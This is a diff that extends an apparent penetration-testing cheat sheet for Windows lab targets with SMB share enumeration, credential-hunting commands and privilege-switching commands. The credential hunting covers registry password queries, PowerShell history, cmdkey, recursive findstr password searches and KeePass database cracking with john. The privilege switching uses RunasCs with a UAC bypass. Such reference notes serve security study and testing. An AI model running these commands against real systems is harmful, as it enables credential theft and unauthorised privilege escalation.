@@ -171,6 +171,9 @@ crackmapexec smb 172.16.150.10 -u john -p 'Password123!' --shares
 
 # CMD and PowerShell
 net view \\172.16.150.10
+net share
+net use
+Get-SmbShare
 
 # enum4linux
 enum4linux -S 172.16.150.10
@@ -247,17 +250,61 @@ nxc mssql ips_internal.txt -u john -p 'Password123!' --continue-on-success --loc
 # We can also use CrackMapExec running almost the same commands replacing "nxc" for "crackmapexec". For example:
 crackmapexec smb 172.16.150.10 -u john -p passwords.txt
 ```
-### Local PowerShell Enumeration
-```shell
-
-```
 ### Local Credential Hunting
 ```shell
+# PowerShell History
+powershell -c "Get-History"
+powershell -c "(Get-PSReadlineOption).HistorySavePath"
+type C:\Users\john\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 
+# Registry
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"  
+
+# Display stored credentials
+cmdkey /list
+
+# Finding and Cracking KeePass .kdbx Files
+# CMD
+dir /s /b *.kdbx 
+# PowerShell
+Get-ChildItem -Recurse -Filter *.kdbx
+# Cracking
+keepass2john Database.kdbx > keepasshash
+john --wordlist=/usr/share/wordlists/rockyou.txt keepasshash
+
+# Finding Files potentially containing Credentials
+# .db and KeePass .kdbx
+Get-ChildItem -Path C:\ -Include *.db, *.kdbx -Recurse -ErrorAction SilentlyContinue | Select-Object FullName
+
+# .txt, .ini, .config, .php
+Get-ChildItem -Path C:\ -Include *.txt, *.ini, *.config, *.php -Recurse -ErrorAction SilentlyContinue | Select-Object FullName
+
+# More commands to search for credentials
+findstr /si password *.txt  
+findstr /si password *.xml  
+findstr /si password *.ini  
+findstr /si password *.config 
+findstr /si pass/pwd *.ini
+findstr /si password *.xml *.ini *.txt
+findstr /spin "password" *.*
+
+dir .s *pass* == *.config
+dir /s *pass* == *cred* == *vnc* == *.config*  
 ```
 ### Runas and RunasCs.exe
 ```shell
+# Native Runas
+# Change user to "jane"
+runas /user:jane cmd # # Enter the password now when asked
+# With domain
+runas /netonly /user:vorkharium.com\john cmd
 
+# RunasCs.exe
+# Using RunasCs.exe with pwnednewuser (pwnednewuser is a new user with admin rights we added before through an exploit)
+./RunasCs.exe pwnednewuser 'password123!' "cmd /c type C:\Users\Administrator\Desktop\root.txt" --bypass-uac --logon-type '8' --force-profile
 ```
 ### BloodHound, SharpHound.exe, bloodhound-python
 ```shell
